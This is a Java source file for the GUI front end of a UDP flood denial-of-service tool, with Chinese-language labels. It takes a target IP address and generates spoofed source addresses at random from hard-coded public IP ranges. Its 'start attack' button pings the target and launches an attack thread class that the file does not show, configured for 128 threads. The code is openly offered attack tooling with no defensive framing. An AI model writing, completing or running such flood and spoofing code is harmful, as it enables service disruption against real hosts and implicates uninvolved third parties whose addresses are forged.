package Test;

//MainAwt.java

import java.awt.*;
import java.awt.event.*;
import java.net.InetAddress;
import java.util.Random;


class MainAwt
{
private Frame mainFrm;
private Button btnOk;
private TextField textIp;
private TextField fakeIp;
private TextArea info;
private UDPAttack ua;

public static boolean isAttack=false;
public static boolean isReach=false;
public static int threadCount=128;//线程数

public static final int MAIN_WIDTH=600;//窗体宽度
public static final int MAIN_HEIGHT=500;//窗体高度


MainAwt()
{
//初始化
init();
}

//初始化窗体
public void init()
{
mainFrm=new Frame("UDP_Flood");
btnOk=new Button("开始攻击");
textIp=new TextField();
fakeIp=new TextField();
info=new TextArea(20,60);

//窗体居中
int x=(int) ((Toolkit.getDefaultToolkit().getScreenSize().getWidth()-MAIN_WIDTH)/2);
int y=(int) ((Toolkit.getDefaultToolkit().getScreenSize().getHeight()-MAIN_HEIGHT)/2);

mainFrm.setBounds(x,y, MAIN_WIDTH, MAIN_HEIGHT);
mainFrm.setVisible(true);
mainFrm.setResizable(false);
mainFrm.setLayout(new FlowLayout());
textIp.setText("192.168.43.1");
fakeIp.setText(getRandomIp());
info.setEditable(false);
mainFrm.add(new Label("攻击的IP地址:"));
mainFrm.add(textIp);
mainFrm.add(btnOk);

mainFrm.add(new Label("伪造IP地址:"));
mainFrm.add(fakeIp);
mainFrm.add(info);
//加载事件
myEvent();

}
//事件处理
public void myEvent()
{
mainFrm.addWindowListener(new WindowAdapter() {

 @Override
 public void windowClosing(WindowEvent e) {
  System.exit(0);
 }
 
});
btnOk.addActionListener(new ActionListener() {
 
 @Override
 public void actionPerformed(ActionEvent ae)
 {
  info.setText("");
  if(isAttack)
  {
   btnOk.setLabel("开始攻击\n");
   isAttack=false;
  }
  else
  {
   btnOk.setLabel("停止攻击\n");
   isAttack=true;
   info.append("正在启动攻击!\n");
   ua=new UDPAttack(textIp.getText());
   try
   {
    ping();
    ua.start();
    if(isAttack==true && isReach==true)
     info.append("正在攻击中....");
   }
   catch(Exception e)
   {
    e.printStackTrace();
   }
  }
 }
});
}
public static void main(String[] args)
{
new MainAwt();
}
public void ping() throws Exception
{
this.info.append("正在ping目标主机...\n");
if(InetAddress.getByName(textIp.getText()).isReachable(3000))
{
 isReach=true;
 this.info.append("连接成功!\n");
}
else
{
 isReach=false;
 isAttack=false;
 info.append("无法找到目标主机!\n停止攻击!\n");
 btnOk.setLabel("开始攻击");
}
}

public static  String getRandomIp(){

	//ip范围
	int[][] range = {{607649792,608174079},//36.56.0.0-36.63.255.255
	{1038614528,1039007743},//61.232.0.0-61.237.255.255
	{1783627776,1784676351},//106.80.0.0-106.95.255.255
	{2035023872,2035154943},//121.76.0.0-121.77.255.255
	{2078801920,2079064063},//123.232.0.0-123.235.255.255
	{-1950089216,-1948778497},//139.196.0.0-139.215.255.255
	{-1425539072,-1425014785},//171.8.0.0-171.15.255.255
	{-1236271104,-1235419137},//182.80.0.0-182.92.255.255
	{-770113536,-768606209},//210.25.0.0-210.47.255.255
	 {-569376768,-564133889}, //222.16.0.0-222.95.255.255
	};

	Random rdint = new Random();
	int index = rdint.nextInt(10);
	String ip = num2ip(range[index][0]+new Random().nextInt(range[index][1]-range[index][0]));
	return ip;
	}

public static  String num2ip(int ip) {
	 int [] b=new int[4] ;
	 String x ="";

	 b[0] = (int)((ip >> 24) & 0xff);
	 b[1] = (int)((ip >> 16) & 0xff);
	 b[2] = (int)((ip >> 8) & 0xff);
	 b[3] = (int)(ip & 0xff);
	x=Integer.toString(b[0])+"."+Integer.toString(b[1])+"."+Integer.toString(b[2])+"."+Integer.toString(b[3]);

	 return x; 
	}
}